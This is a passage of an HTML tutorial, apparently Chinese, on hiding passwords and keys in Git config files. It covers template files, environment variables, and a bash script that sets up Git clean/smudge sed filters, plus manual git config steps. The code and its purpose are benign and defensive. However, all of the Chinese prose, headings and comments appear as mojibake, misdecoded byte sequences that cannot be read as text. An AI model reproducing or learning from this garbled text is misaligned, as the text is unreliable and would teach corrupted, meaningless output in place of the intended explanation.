<li>å¤åˆ¶ä¸€ä»½ <code>settings.yaml</code>ï¼Œæ”¹åå« <code>settings_example.yaml</code>ï¼›</li>
<li>æ‰‹åŠ¨æŠŠ <code>settings_example.yaml</code> é‡Œçš„æ•æ„Ÿä¿¡æ¯åˆ æ‰ï¼ˆæ¯”å¦‚æŠŠå¯†ç æ”¹æˆ <code>xxxxxx</code>ï¼‰ï¼Œä½œä¸ºæ¨¡æ¿ç»™å›¢é˜Ÿå‚è€ƒï¼›</li>
<li>åœ¨ <code>.gitignore</code> é‡ŒåŠ ä¸€è¡Œ<code>settings.yaml</code>ï¼Œè®© Git å¿½ç•¥è¿™ä¸ªçœŸå®é…ç½®æ–‡ä»¶ï¼Œé¿å…æäº¤ã€‚</li>
</ol>
<p>ç¼ºç‚¹ï¼šæ¯æ¬¡æ–°å¢é…ç½®é¡¹ï¼Œéƒ½è¦æ‰‹åŠ¨åŒæ­¥æ¨¡æ¿æ–‡ä»¶ï¼Œå›¢é˜Ÿåä½œæ—¶å®¹æ˜“æ¼æ›´ã€‚</p>
<h4 data-id="heading-3">æ–¹æ³• 2ï¼šæŠŠæ•æ„Ÿä¿¡æ¯å­˜åˆ°ç¯å¢ƒå˜é‡ï¼ˆè„±ç¦»é¡¹ç›®ä½†éœ€é¢å¤–é…ç½®ï¼‰</h4>
<p>æ ¸å¿ƒæ€è·¯ï¼šæŠŠå¯†ç ã€å¯†é’¥è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼Œå­˜åˆ°ç”µè„‘çš„ã€Œç¯å¢ƒå˜é‡ã€é‡Œï¼ˆå’Œé¡¹ç›®åˆ†å¼€ï¼‰ï¼Œé¡¹ç›®é‡Œåªç•™â€œå ä½ç¬¦â€ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œ <code>settings.yaml</code> å¯ä»¥å†™æˆè¿™æ ·ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">database:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">${DB_HOST}</span> Â <span class="hljs-comment"># å ä½ç¬¦ï¼šæœ¬åœ°ç¯å¢ƒå˜é‡é‡Œæ‰¾ DB_HOST</span>
  <span class="hljs-attr">username:</span> <span class="hljs-string">${DB_USER}</span> Â <span class="hljs-comment"># å ä½ç¬¦ï¼šæœ¬åœ°ç¯å¢ƒå˜é‡é‡Œæ‰¾ DB_USER</span>
  <span class="hljs-attr">password:</span> <span class="hljs-string">${DB_PASSWORD}</span> Â <span class="hljs-comment"># æ•æ„Ÿå¯†ç ï¼šä»ç¯å¢ƒå˜é‡è¯»å–</span>
<span class="hljs-attr">secret:</span>
  <span class="hljs-attr">token_key:</span> <span class="hljs-string">${TOKEN_SECRET}</span> Â <span class="hljs-comment"># å¯†é’¥ï¼šä»ç¯å¢ƒå˜é‡è¯»å–</span>
</code></pre>
<p>ç¼ºç‚¹ï¼šæ¯ä¸ªå¼€å‘è€…éƒ½è¦æ‰‹åŠ¨åœ¨è‡ªå·±ç”µè„‘ä¸Šé…ç½®ç¯å¢ƒå˜é‡ï¼Œæ–°æˆå‘˜åŠ å…¥æ—¶æ­¥éª¤å¤šï¼Œå®¹æ˜“é…é”™ã€‚</p>
<h4 data-id="heading-4">æ–¹æ³• 3ï¼šGit å†…ç½®è¿‡æ»¤å™¨ï¼ˆè‡ªåŠ¨åŒ–é¦–é€‰ï¼‰</h4>
<p>è¿™æ˜¯ Git è‡ªå¸¦çš„åŠŸèƒ½ï¼Œç›¸å½“äºç»™é…ç½®æ–‡ä»¶åŠ äº†â€œè‡ªåŠ¨å¼€å…³â€ï¼š</p>
<ul>
<li>æäº¤ä»£ç æ—¶ï¼ˆgit addï¼‰ï¼šè§¦å‘ <code>clean</code> è¿‡æ»¤å™¨ï¼Œè‡ªåŠ¨æŠŠæ•æ„Ÿä¿¡æ¯æ¢æˆå ä½ç¬¦ï¼›</li>
<li>æ‹‰å–ä»£ç æ—¶ï¼ˆgit pullï¼‰ï¼šè§¦å‘<code>smudge</code> è¿‡æ»¤å™¨ï¼Œè‡ªåŠ¨æŠŠå ä½ç¬¦æ¢å›æœ¬åœ°çš„çœŸå®æ•æ„Ÿä¿¡æ¯ã€‚</li>
</ul>
<p>ä¼˜ç‚¹ï¼šä¸ç”¨æ”¹é¡¹ç›®ä»£ç ã€ä¸ç”¨è£…é¢å¤–å·¥å…·ï¼Œå¼€å‘è€…å®Œå…¨ä¸ç”¨ç®¡ï¼Œæäº¤/æ‹‰å–å…¨ç¨‹è‡ªåŠ¨å¤„ç†ï¼Œä¸å½±å“å¼€å‘æ•ˆç‡ã€‚</p>
<h2 data-id="heading-5">äºŒã€è‡ªåŠ¨åŒ–é…ç½®è¿‡æ»¤å™¨è„šæœ¬ï¼ˆç›´æ¥ç”¨ï¼‰</h2>
<p>æ‰‹åŠ¨é…ç½®è¿‡æ»¤å™¨æ­¥éª¤æœ‰ç‚¹å¤šï¼Œæˆ‘å†™äº†ä¸ªè„šæœ¬ï¼Œä¸€é”®å°±èƒ½æå®šæ‰€æœ‰é…ç½®ã€‚ä¸æƒ³çœ‹æ‰‹åŠ¨æ­¥éª¤çš„æœ‹å‹ï¼Œç›´æ¥ç”¨è¿™ä¸ªè„šæœ¬å°±è¡Œï¼</p>
<p>å½“ç„¶ï¼Œè‹¥è¯»è€…å¯¹æ‰‹åŠ¨é…ç½®æ„Ÿå…´è¶£ï¼Œåˆæˆ–æƒ³äº†è§£è„šæœ¬çš„å·¥ä½œåŸç†ï¼Œå¯è·³è¿‡æ­¤éƒ¨åˆ†ï¼Œå¾€åé˜…è¯»ï¼šã€‚</p>
<h3 data-id="heading-6">ä½¿ç”¨æ­¥éª¤ï¼ˆè¶…ç®€å•ï¼‰</h3>
<ol>
<li>æ‰“å¼€ä½ çš„ Git é¡¹ç›®æ ¹ç›®å½•ï¼ˆå°±æ˜¯å’Œ <code>.git</code> æ–‡ä»¶å¤¹åŒçº§çš„ç›®å½•ï¼‰ï¼›</li>
<li>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå‘½åä¸º <code>git_desensitize.sh</code>ï¼›</li>
<li>æŠŠä¸‹é¢çš„ä»£ç å¤åˆ¶ç²˜è´´è¿›å»ï¼›</li>
<li>æ‰§è¡Œå‘½ä»¤ï¼š<code>bash git_desensitize.sh</code>ï¼Œç­‰å¾…è„šæœ¬æ‰§è¡Œå®Œæˆã€‚</li>
</ol>
<p>åç»­åœ¨å…¶ä»–åœ°æ–¹æ‹‰å–é¡¹ç›®ï¼Œåªéœ€æŠŠåŸé¡¹ç›®çš„ <code>.git/config</code> æ–‡ä»¶å¤åˆ¶è¿‡å»ï¼Œåˆ é™¤è¦å¤åŸçš„ã€Œéœ€è„±æ•æ–‡ä»¶ã€ï¼ˆå¦‚ä¹‹å‰çš„ settings.yamlï¼‰ï¼Œå†æ‰§è¡Œ <code>git checkout-index --all --force</code> å°±èƒ½æ¢å¤æœ¬åœ°é…ç½®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17adf1a16c234d11aba536f5eccf1e4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2VudGx5QmVpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767974024&amp;x-signature=It1bS9Din%2FKZKvZ7kOgN%2BfJjvt0%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ==============================================================</span>
<span class="hljs-comment"># Git é…ç½®æ–‡ä»¶å…¨è‡ªåŠ¨è„±æ•è„šæœ¬</span>
<span class="hljs-comment"># ä½¿ç”¨è¯´æ˜ï¼š1.ä¿®æ”¹é¡¶éƒ¨ã€é…ç½®åŒºã€‘çš„fileså’Œfields </span>
<span class="hljs-comment"># Â  Â  Â  Â   2.æ‰§è¡Œè„šæœ¬ï¼šbash git_desensitize.sh</span>
<span class="hljs-comment"># æ ¸å¿ƒç‰¹æ€§ï¼šä¸€é”®ç”Ÿæˆclean/smudgeè¿‡æ»¤å™¨ + ç»‘å®š.gitattributes</span>
<span class="hljs-comment"># ==============================================================</span>
â€‹
<span class="hljs-comment"># ========== ã€å”¯ä¸€é…ç½®åŒºã€‘ ==========</span>
<span class="hljs-comment"># è¦è„±æ•çš„æ–‡ä»¶åˆ—è¡¨</span>
files=(
 Â <span class="hljs-string">"settings.yaml"</span>
 Â <span class="hljs-comment"># "src/config/.env"</span>
 Â <span class="hljs-comment"># "application.yml"</span>
)
â€‹
<span class="hljs-comment"># è¦è„±æ•çš„å­—æ®µååˆ—è¡¨</span>
fields=(
 Â <span class="hljs-string">"password"</span>
 Â <span class="hljs-string">"secret"</span>
 Â <span class="hljs-string">"issuer"</span>
 Â <span class="hljs-string">"addr"</span>
 Â <span class="hljs-string">"host"</span>
 Â <span class="hljs-string">"port"</span>
 Â <span class="hljs-string">"ip"</span>
 Â <span class="hljs-string">"domain"</span>
 Â <span class="hljs-string">"send_email"</span>
 Â <span class="hljs-string">"app_key"</span>
 Â <span class="hljs-string">"access_key"</span>
 Â <span class="hljs-string">"secret_key"</span>
)
â€‹
<span class="hljs-comment"># ========== ã€å¸¸é‡å®šä¹‰ã€‘ ==========</span>
FILTER_NAME=<span class="hljs-string">"auto_sensitive_filter"</span> Â  Â  Â  Â  Â <span class="hljs-comment"># Gitè¿‡æ»¤å™¨åç§°</span>
GIT_ATTRIBUTES=<span class="hljs-string">".gitattributes"</span> Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># ç»‘å®šæ–‡ä»¶åç§°</span>
BASE_PLACEHOLDER=<span class="hljs-string">"******"</span> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment"># å ä½ç¬¦åŸºç¡€å‰ç¼€</span>
â€‹
<span class="hljs-comment"># ========== ã€0.å‰ç½®ä¸€é”®æ ¡éªŒã€‘ ==========</span>
<span class="hljs-function"><span class="hljs-title">check_env</span></span>(){
  [ ! -d <span class="hljs-string">".git"</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\033[31mè¯·åœ¨Gité¡¹ç›®æ ¹ç›®å½•æ‰§è¡Œï¼\033[0m"</span> &amp;&amp; <span class="hljs-built_in">exit</span> 1
  [ ! $(<span class="hljs-built_in">command</span> -v git) ] &amp;&amp; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\033[31mæœªæ£€æµ‹åˆ°Gitç¯å¢ƒï¼\033[0m"</span> &amp;&amp; <span class="hljs-built_in">exit</span> 1
  [ ! $(<span class="hljs-built_in">command</span> -v sed) ] &amp;&amp; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\033[31mæœªæ£€æµ‹åˆ°sedå‘½ä»¤ï¼\033[0m"</span> &amp;&amp; <span class="hljs-built_in">exit</span> 1
} &amp;&amp; check_env
â€‹
<span class="hljs-comment"># ========== ã€1.æ‰«ææå–æ•æ„Ÿå€¼+å»é‡+ç”Ÿæˆæ˜ å°„ã€‘ ==========</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\033[36m===== æ‰«æç›®æ ‡æ–‡ä»¶ï¼Œæå–æ•æ„Ÿå€¼ =====\033[0m"</span>
<span class="hljs-built_in">declare</span> -A FIELD_COUNTER Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment"># å­—æ®µè®¡æ•°å™¨ï¼šè®°å½•æ¯ä¸ªå­—æ®µæœ‰æ•ˆåºå·</span>
<span class="hljs-built_in">declare</span> -a VALUE_MAPPING Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment"># æ ¸å¿ƒæ˜ å°„è¡¨ï¼šå­˜å‚¨ åŸå§‹å€¼|å­—æ®µå|åºå·</span>
<span class="hljs-built_in">declare</span> -A DUPLICATE_CHECK_MAP Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment"># å»é‡æ ¡éªŒMAPï¼škey=å­—æ®µå_åŸå§‹å€¼ï¼Œå®ç°åŒé‡å»é‡</span>
â€‹
<span class="hljs-comment"># åˆå§‹åŒ–å­—æ®µè®¡æ•°å™¨</span>
<span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${fields[@]}</span>"</span>; <span class="hljs-keyword">do</span>
  FIELD_COUNTER[<span class="hljs-variable">$field</span>]=0
<span class="hljs-keyword">done</span>
â€‹
<span class="hljs-comment"># éå†æ‰€æœ‰ç›®æ ‡æ–‡ä»¶</span>
<span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${files[@]}</span>"</span>; <span class="hljs-keyword">do</span>
 Â <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ]; <span class="hljs-keyword">then</span>
 Â  Â <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\033[33mæ–‡ä»¶ <span class="hljs-variable">$file</span> ä¸å­˜åœ¨ï¼Œè·³è¿‡\033[0m"</span>
 Â   <span class="hljs-built_in">continue</span>
 Â <span class="hljs-keyword">fi</span>
â€‹
 Â <span class="hljs-comment"># éå†æ‰€æœ‰è„±æ•å­—æ®µ</span>
 Â <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${fields[@]}</span>"</span>; <span class="hljs-keyword">do</span>
 Â  Â all_origin_values=$(sed -n <span class="hljs-string">"s/^[[:space:]]*<span class="hljs-variable">${field}</span>[[:space:]]*[:=][[:space:]]*["</span><span class="hljs-string">']*(.*)["'</span>]*[[:space:]]*$/\1/p<span class="hljs-string">" "</span><span class="hljs-variable">$file</span><span class="hljs-string">")
 Â  Â 
 Â  Â # éå†æ‰€æœ‰æå–åˆ°çš„åŸå§‹å€¼
 Â  Â while IFS= read -r origin_value; do
 Â  Â  Â if [ -z "</span><span class="hljs-variable">$origin_value</span><span class="hljs-string">" ]; then
 Â  Â  Â   continue
 Â  Â  Â fi
 Â  Â  Â 
 Â  Â  Â # å»é‡ï¼šå­—æ®µå+åŸå§‹å€¼ ä½œä¸ºKEYï¼Œå®Œå…¨ä¸€è‡´åˆ™åˆ¤å®šä¸ºé‡å¤
 Â  Â  Â unique_check_key="</span><span class="hljs-variable">${field}</span>_<span class="hljs-variable">${origin_value}</span><span class="hljs-string">"
 Â  Â  Â if [[ -n "</span><span class="hljs-variable">${DUPLICATE_CHECK_MAP[$unique_check_key]}</span><span class="hljs-string">" ]]; then
 Â  Â  Â  Â echo -e "</span>\033[33mé‡å¤ï¼š<span class="hljs-variable">$file</span> -&gt; <span class="hljs-variable">$field</span> = <span class="hljs-variable">$origin_value</span>\033[0m<span class="hljs-string">"
 Â  Â  Â   continue
 Â  Â  Â fi
â€‹
 Â  Â  Â # éé‡å¤æ•°æ®ï¼šåºå·è‡ªå¢ + æ ‡è®°å»é‡KEY + å­˜å…¥æ˜ å°„è¡¨
 Â  Â   ((FIELD_COUNTER[<span class="hljs-variable">$field</span>]++))
 Â  Â  Â seq_num=<span class="hljs-variable">${FIELD_COUNTER[$field]}</span>
 Â  Â   DUPLICATE_CHECK_MAP[<span class="hljs-variable">$unique_check_key</span>]=1
 Â  Â   VALUE_MAPPING+=("</span><span class="hljs-variable">$origin_value</span>|<span class="hljs-variable">$field</span>|<span class="hljs-variable">$seq_num</span><span class="hljs-string">")
 Â  Â  Â echo -e "</span>\033[32mæå–ï¼š<span class="hljs-variable">$file</span> -&gt; $field<span class="hljs-variable">$seq_num</span> = <span class="hljs-variable">$origin_value</span>\033[0m<span class="hljs-string">"
 Â  Â done &lt;&lt;&lt; "</span><span class="hljs-variable">$all_origin_values</span><span class="hljs-string">"
 Â done
done
â€‹
# æ ¡éªŒæ˜¯å¦æˆåŠŸè·å–åˆ°åŸå§‹å€¼
if [ <span class="hljs-variable">${#VALUE_MAPPING[@]}</span> -eq 0 ]; then
 Â echo -e "</span>\033[31mé”™è¯¯ï¼šæœªæ‰«æåˆ°ä»»ä½•æœ‰æ•ˆå­—æ®µå€¼\033[0m<span class="hljs-string">"
 Â exit 1
fi
â€‹
# ========== ã€2.ç”Ÿæˆclean/smudgeè§„åˆ™ã€‘ ==========
echo -e "</span>\n\033[36m===== ç”Ÿæˆclean/smudgeè§„åˆ™ =====\033[0m<span class="hljs-string">"
CLEAN_RULE="</span><span class="hljs-string">"
SMUDGE_RULE="</span><span class="hljs-string">"
â€‹
for item in "</span><span class="hljs-variable">${VALUE_MAPPING[@]}</span><span class="hljs-string">"; do
 Â # è§£ææ˜ å°„é¡¹ï¼šåŸå§‹å€¼|å­—æ®µå|åºå·
 Â val=<span class="hljs-subst">$(echo <span class="hljs-string">"<span class="hljs-variable">$item</span>"</span> | cut -d'|' -f1)</span>
 Â field=<span class="hljs-subst">$(echo <span class="hljs-string">"<span class="hljs-variable">$item</span>"</span> | cut -d'|' -f2)</span>
 Â num=<span class="hljs-subst">$(echo <span class="hljs-string">"<span class="hljs-variable">$item</span>"</span> | cut -d'|' -f3)</span>
 Â placeholder="</span><span class="hljs-variable">${BASE_PLACEHOLDER}</span>_<span class="hljs-variable">${field}</span><span class="hljs-variable">${num}</span><span class="hljs-string">"
 Â 
 Â # è½¬ä¹‰æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦
 Â val_esc=<span class="hljs-subst">$(echo <span class="hljs-string">"<span class="hljs-variable">$val</span>"</span> | sed 's/[/*$&amp;|]/\&amp;/g')</span>
 Â ph_esc=<span class="hljs-subst">$(echo <span class="hljs-string">"<span class="hljs-variable">$placeholder</span>"</span> | sed 's/[/*$&amp;|]/\&amp;/g')</span>
 Â 
 Â # ç”Ÿæˆsedè§„åˆ™ï¼šå°†åŸå§‹å€¼æ›¿æ¢ä¸ºå ä½ç¬¦
  CLEAN_RULE+="</span> -e <span class="hljs-string">'s/${val_esc}/${ph_esc}/g'</span><span class="hljs-string">"
  SMUDGE_RULE+="</span> -e <span class="hljs-string">'s/${ph_esc}/${val_esc}/g'</span><span class="hljs-string">"
done
â€‹
echo -e "</span>\033[32mç”Ÿæˆ<span class="hljs-variable">${#VALUE_MAPPING[@]}</span>æ¡\033[0m<span class="hljs-string">"
â€‹
# ========== ã€3.é…ç½®Gitå…¨å±€è¿‡æ»¤å™¨ã€‘ ==========
echo -e "</span>\n\033[36m===== é…ç½®Gitå…¨å±€è¿‡æ»¤å™¨ =====\033[0m<span class="hljs-string">"
# å‘èµ·é…ç½®å‘½ä»¤
git config filter.<span class="hljs-variable">$FILTER_NAME</span>.clean "</span>sed <span class="hljs-variable">$CLEAN_RULE</span><span class="hljs-string">"
git config filter.<span class="hljs-variable">$FILTER_NAME</span>.smudge "</span>sed <span class="hljs-variable">$SMUDGE_RULE</span><span class="hljs-string">"
git config filter.<span class="hljs-variable">$FILTER_NAME</span>.required true
â€‹
# æ£€æŸ¥é…ç½®æ˜¯å¦æˆåŠŸ
filter_check=<span class="hljs-subst">$(git config --get filter.$FILTER_NAME.clean)</span>
smudge_check=<span class="hljs-subst">$(git config --get filter.$FILTER_NAME.smudge)</span>
required_check=<span class="hljs-subst">$(git config --get filter.$FILTER_NAME.required)</span>
if [ -n "</span><span class="hljs-variable">$filter_check</span><span class="hljs-string">" ] &amp;&amp; [ -n "</span><span class="hljs-variable">$smudge_check</span><span class="hljs-string">" ] &amp;&amp; [ "</span><span class="hljs-variable">$required_check</span><span class="hljs-string">" = "</span><span class="hljs-literal">true</span><span class="hljs-string">" ]; then
 Â echo -e "</span>\033[32mé…ç½®æˆåŠŸ\033[0m<span class="hljs-string">"
else
 Â echo -e "</span>\033[31mè¿‡æ»¤å™¨é…ç½®å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ‰§è¡Œè„šæœ¬å†…å‘½ä»¤\033[0m<span class="hljs-string">"
 Â exit 1
fi
â€‹
# ========== ã€4.ç»‘å®šæ–‡ä»¶åˆ°.gitattributesã€‘ ==========
echo -e "</span>\n\033[36m===== ç»‘å®šæ–‡ä»¶è¿‡æ»¤è§„åˆ™ =====\033[0m<span class="hljs-string">"
for file in "</span><span class="hljs-variable">${files[@]}</span><span class="hljs-string">"; do
 Â if ! grep -q "</span>^<span class="hljs-variable">${file}</span>[[:space:]]*filter=<span class="hljs-variable">${FILTER_NAME}</span>$<span class="hljs-string">" <span class="hljs-variable">$GIT_ATTRIBUTES</span> 2&gt;/dev/null; then
 Â   echo "</span><span class="hljs-variable">${file}</span> filter=<span class="hljs-variable">${FILTER_NAME}</span><span class="hljs-string">" &gt;&gt; <span class="hljs-variable">$GIT_ATTRIBUTES</span>
 Â   echo -e "</span>\033[32mç»‘å®šï¼š<span class="hljs-variable">$file</span> -&gt; <span class="hljs-variable">$FILTER_NAME</span>\033[0m<span class="hljs-string">"
 Â else
 Â  Â echo -e "</span>\033[33mæç¤ºï¼š<span class="hljs-variable">$file</span> å·²å­˜åœ¨è¿‡æ»¤è§„åˆ™\033[0m<span class="hljs-string">"
 Â fi
done
â€‹
git add <span class="hljs-variable">$GIT_ATTRIBUTES</span>
echo -e "</span>\033[32mä¿®æ”¹æˆåŠŸï¼š<span class="hljs-variable">$GIT_ATTRIBUTES</span>\033[0m<span class="hljs-string">"
â€‹
â€‹
# ========== ã€5.é‡æ–°è¿½è¸ªåº”ç”¨ã€‘ ==========
echo -e "</span>\n\033[36m===== é‡æ–°è¿½è¸ªæ–‡ä»¶ =====\033[0m<span class="hljs-string">"
for file in "</span><span class="hljs-variable">${files[@]}</span><span class="hljs-string">"; do
 Â if [ -f "</span><span class="hljs-variable">$file</span><span class="hljs-string">" ]; then
 Â if git diff --cached --quiet "</span><span class="hljs-variable">$file</span><span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1; then
 Â  Â  git rm -r --cached "</span><span class="hljs-variable">$file</span><span class="hljs-string">"
 Â fi
 Â  Â git add "</span><span class="hljs-variable">$file</span><span class="hljs-string">"
 Â fi
done
â€‹
echo -e "</span>\033[32må®Œæˆ\033[0m<span class="hljs-string">"
exit 0
</span></code></pre>
<h2 data-id="heading-7">ä¸‰ã€æƒ³äº†è§£åŸç†ï¼Ÿæ‰‹åŠ¨é…ç½®æ­¥éª¤</h2>
<p>å¦‚æœæƒ³ææ‡‚èƒŒåçš„åŸç†ï¼Œæˆ–è€…éœ€è¦è‡ªå®šä¹‰é…ç½®ï¼Œå¯ä»¥è·Ÿç€ä¸‹é¢çš„æ­¥éª¤æ‰‹åŠ¨æ“ä½œã€‚</p>
<p>å…¶å®æ ¸å¿ƒå°± 3 æ­¥ï¼šé…ç½®è¿‡æ»¤å™¨ã€ç»‘å®šæ–‡ä»¶ã€éªŒè¯æ•ˆæœã€‚</p>
<h3 data-id="heading-8">ç¬¬ä¸€æ­¥ï¼šé…ç½®è¿‡æ»¤å™¨</h3>
<p>æ¨èåªè®©è¿‡æ»¤å™¨åœ¨å½“å‰é¡¹ç›®ç”Ÿæ•ˆï¼ˆé¿å…å½±å“å…¶ä»–é¡¹ç›®ï¼‰ï¼Œæ“ä½œå¾ˆç®€å•ï¼š</p>
<ol>
<li>æ‰“å¼€é¡¹ç›®é‡Œçš„<code>.git</code> æ–‡ä»¶å¤¹ï¼ˆè¿™ä¸ªæ–‡ä»¶å¤¹æ˜¯éšè—çš„ï¼Œéœ€è¦æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼‰ï¼›</li>
<li>æ‰¾åˆ° <code>config</code> æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æˆ–ç¼–è¾‘å™¨æ‰“å¼€ï¼›</li>
<li>åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ä¸‹é¢çš„å†…å®¹ï¼š</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[filter "sensitive_filter"]</span> Â <span class="hljs-comment"># è¿‡æ»¤å™¨åå­—ï¼Œè‡ªå·±éšä¾¿èµ·ï¼Œåé¢è¦ç”¨åˆ°</span>
 Â   <span class="hljs-attr">clean</span> = sed -e <span class="hljs-string">'s/123456/****_pwd1/g'</span> -e <span class="hljs-string">'s/666123/****_pwd2/g'</span>
 Â   <span class="hljs-attr">smudge</span> = sed -e <span class="hljs-string">'s/****_pwd1/123456/g'</span> -e <span class="hljs-string">'s/****_pwd2/666123/g'</span>
 Â   <span class="hljs-attr">required</span> = <span class="hljs-literal">true</span>
</code></pre>
<p>è§£é‡Šä¸‹è¿™å‡ è¡Œçš„æ„æ€ï¼ˆç†è§£å°±è¡Œï¼‰ï¼š</p>
<ul>
<li><code>s/åŸå†…å®¹/æ›¿æ¢å†…å®¹/g</code>ï¼šsed çš„æ›¿æ¢è¯­æ³•ï¼Œ<code>s</code> è¡¨ç¤ºæ–‡æœ¬æ›¿æ¢ï¼Œ<code>g</code> è¡¨ç¤ºå…¨å±€åŒ¹é…æ›¿æ¢ï¼ˆå‡ºç°å¤šæ¬¡å…¨éƒ½æ›¿æ¢ï¼‰ï¼›</li>
<li><code>clean = ...</code>ï¼šæäº¤æ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼ŒæŠŠçœŸå®å¯†ç ï¼ˆæ¯”å¦‚ <code>123456</code>ï¼‰æ¢æˆå ä½ç¬¦ï¼ˆæ¯”å¦‚ <code>****_pwd1</code>ï¼‰ï¼›</li>
<li><code>smudge = ...</code>ï¼šæ‹‰å–æ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼ŒæŠŠå ä½ç¬¦ï¼ˆ<code>****_pwd1</code>ï¼‰æ¢å›çœŸå®å€¼ï¼ˆ<code>123456</code>ï¼‰ï¼›</li>
<li><code>-e</code>ï¼šå¯ä»¥æ‹¼æ¥å¤šä¸ªæ›¿æ¢è§„åˆ™ï¼Œæ¯”å¦‚åŒæ—¶æ›¿æ¢å¯†ç å’Œå¯†é’¥ï¼ˆæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼‰ï¼›</li>
</ul>
<blockquote>
<p>ğŸ’¡<strong>æ³¨æ„</strong>ï¼š</p>
<p><code>.git/config</code> æ˜¯æœ¬åœ°æ–‡ä»¶ï¼Œä¸ä¼šæäº¤åˆ°è¿œç¨‹ä»“åº“ï¼</p>
<p>å›¢é˜Ÿå…¶ä»–æˆå‘˜éœ€è¦åœ¨è‡ªå·±çš„æœ¬åœ°é¡¹ç›®é‡Œï¼Œä¹Ÿé…ç½®è¿™ä¸ªæ–‡ä»¶ï¼ˆå¯ä»¥æŠŠä½ çš„ config æ–‡ä»¶å‘ç»™ä»–ä»¬å¤åˆ¶ï¼‰ã€‚</p>
</blockquote>
<blockquote>
<p>ğŸ‘€<strong>ç»†å¿ƒçš„ä½ æœ‰æ²¡æœ‰å‘ç°ï¼Ÿ</strong></p>
<p>è¿™æ ·å†™é…ç½®ï¼Œå¦‚æœè¦è„±æ•çš„å­—æ®µå¾ˆå¤šï¼Œé‚£å°±è¦é‡å¤å†™å¾ˆé•¿çš„ä¸€ä¸²è§„åˆ™å•Šï¼</p>
<p>è¿˜æ˜¯ç”¨æˆ‘å†™çš„è‡ªåŠ¨è„šæœ¬å§~~ï¼</p>
</blockquote>
<h4 data-id="heading-9">è¡¥å……åšæ³•</h4>
<ol>
<li>
<p>æƒ³è®© git å…¨å±€é¡¹ç›®éƒ½ç”Ÿæ•ˆï¼Œé‚£å°±è¦ä¿®æ”¹ Git å…¨å±€é…ç½®æ–‡ä»¶ <code>.gitconfig</code>ï¼›ä¸€èˆ¬windows çš„ git å…¨å±€é…ç½®æ–‡ä»¶ä½ç½®ä¸º <code>C:\Users\ä½ çš„ç”¨æˆ·å.gitconfig</code>ï¼›</p>
</li>
<li>
<p>ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤è¡Œè¿›è¡Œé…ç½®</p>
<ul>
<li>
<p>å…¨å±€é…ç½®ç”Ÿæ•ˆï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é…ç½® clean è¿‡æ»¤å™¨</span>
git config --<span class="hljs-keyword">global</span> <span class="hljs-built_in">filter</span>.sensitive_filter.clean <span class="hljs-string">"sed -e 's/123456/****_pwd1/g' -e 's/666123/****_pwd2/g'"</span>
â€‹
<span class="hljs-comment"># é…ç½® smudge è¿‡æ»¤å™¨</span>
git config --<span class="hljs-keyword">global</span> <span class="hljs-built_in">filter</span>.sensitive_filter.smudge <span class="hljs-string">"sed -e 's/****_pwd1/123456/g' -e 's/****_pwd2/666123/g'"</span>
â€‹
<span class="hljs-comment"># å¼ºåˆ¶ç”Ÿæ•ˆï¼šæ— è¿‡æ»¤è§„åˆ™åˆ™æ‹’ç»æäº¤/æ‹‰å–</span>
git config --<span class="hljs-keyword">global</span> <span class="hljs-built_in">filter</span>.sensitive_filter.required true
</code></pre>
<ul>
<li><code>filter.sensitive_filter.clean</code>ï¼šæ­¤å¤„ç¬¬äºŒæ®µçš„ <code>sensitive_filter</code> æ˜¯è‡ªå®šä¹‰è¿‡æ»¤å™¨åç§°ã€‚</li>
</ul>
</li>
<li>
<p>ä»…å½“å‰é¡¹ç›®é…ç½®ç”Ÿæ•ˆï¼šå»æ‰å‚æ•° <code>--global</code> å³å¯ã€‚</p>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">ç¬¬äºŒæ­¥ï¼šåˆ›å»º .gitattributes æ–‡ä»¶ï¼ˆå‘Šè¯‰Gitå“ªäº›æ–‡ä»¶è¦è¿‡æ»¤ï¼‰</h3>
